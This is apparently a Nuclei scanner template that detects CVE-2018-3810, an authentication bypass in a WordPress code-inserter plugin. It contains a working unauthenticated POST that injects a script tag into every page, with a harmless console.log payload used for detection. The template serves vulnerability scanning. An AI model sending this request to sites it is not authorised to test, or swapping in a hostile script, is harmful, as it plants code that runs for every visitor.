id: CVE-2018-3810
info:
  name: Oturia WordPress Smart Google Code Inserter <3.5 - Authentication Bypass
  author: princechaddha
  severity: critical
  description: The Oturia Smart Google Code Inserter plugin for WordPress allows attackers
    to insert unauthorized, potentially harmful code that runs on all pages without
    authentication.
  reference:
  - https://www.exploit-db.com/exploits/43420
  - https://nvd.nist.gov/vuln/detail/CVE-2018-3810
  - https://wordpress.org/plugins/smart-google-code-inserter/#developers
  - https://limbenjamin.com/articles/smart-google-code-inserter-auth-bypass.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-3810
    cwe-id: CWE-287
  tags: wordpress,cve,cve2018,google,edb
  metadata:
    impact: The vulnerability in the Oturia Smart Google Code Inserter plugin for
      WordPress had a significant impact as it allowed unauthenticated attackers to
      insert malicious code on all pages served by WordPress.
    recommendation: It is recommended to update to the latest version of Oturia Smart
      Google Code Inserter plugin for WordPress to prevent unauthenticated attackers
      from inserting arbitrary JavaScript or HTML code that runs on all pages served
      by WordPress.
requests:
- method: POST
  path:
  - '{{BaseURL}}/wp-admin/options-general.php?page=smartcode'
  body: sgcgoogleanalytic=<script>console.log("Nuclei - Open-source project [github.com/projectdiscovery/nuclei]")</script>&sgcwebtools=&button=Save+Changes&action=savegooglecode
  headers:
    Content-Type: application/x-www-form-urlencoded
- method: GET
  path:
  - '{{BaseURL}}'
  matchers-condition: and
  matchers:
  - type: word
    words:
    - text/html
    part: header
  - type: word
    words:
    - <script>console.log("Nuclei - Open-source project [github.com/projectdiscovery/nuclei]")</script>
    part: body
  - type: status
    status:
    - 200
